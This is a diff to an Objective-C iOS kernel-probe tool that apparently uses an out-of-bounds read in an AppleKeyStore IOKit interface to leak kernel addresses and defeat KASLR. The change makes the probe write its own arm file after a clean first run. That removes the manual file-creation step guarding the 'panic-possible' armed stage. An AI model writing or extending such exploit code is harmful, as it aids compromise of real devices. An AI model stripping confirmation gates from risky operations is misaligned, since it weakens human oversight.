@@ -41,7 +41,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P182_BUILD @"p182-aks-kaslr-oob-v2-feeder"
+#define P182_BUILD @"p182-aks-kaslr-oob-v3-selfstage"
 
 /* ── IOKit (dlsym'd — the house pattern; iOS apps do not link IOKit) ── */
 typedef mach_port_t io_obj_t;
@@ -203,6 +203,20 @@ static int p182_feed(p182_method_t method, io_obj_t conn, int nsc,
         }
     }
 
+    /* SELF-STAGING (2026-11-28 law): the safe dial answered clean, so this
+       probe writes ITS OWN arm file. The deliberate act stays -- a fresh
+       force-quit plus ONE re-tap is the confirmation; the file-creation
+       friction goes. Manual arming still works (any content). */
+    {
+        NSString *stagePath = [docs stringByAppendingPathComponent:@"p182_arm.txt"];
+        NSString *stage = [NSString stringWithFormat:
+            @"staged by p182 after the safe dial OK %@ -- one armed tap per fresh boot\n",
+            LabLocalMilitaryNow() ?: @"?"];
+        [stage writeToFile:stagePath atomically:YES
+                  encoding:NSUTF8StringEncoding error:NULL];
+        L(@"[2] SELF-STAGED: p182_arm.txt written -- force-quit, then ONE armed tap.");
+    }
+
     /* ── 3: the ARMORY gate ── */
     L(@"");
     L(@"=== 3: the armed ladder (Documents/p182_arm.txt — consumed) ===");
@@ -219,7 +233,8 @@ static int p182_feed(p182_method_t method, io_obj_t conn, int nsc,
             L(@"[3] ARM FILE PRESENT — the armed ladder runs (PANIC-POSSIBLE:");
             L(@"    the copyout reads past the ACM buffer; fresh-boot law).");
         } else {
-            L(@"[3] no arm file — the armed ladder HOLDS. Write ANY content to:");
+            L(@"[3] no arm file — the armed ladder HOLDS. It SELF-STAGES after "
+              @"a clean safe dial (or write ANY content to:)");
             L([NSString stringWithFormat:@"    %@", armPath]);
             L(@"    then force-quit and tap once more.");
         }
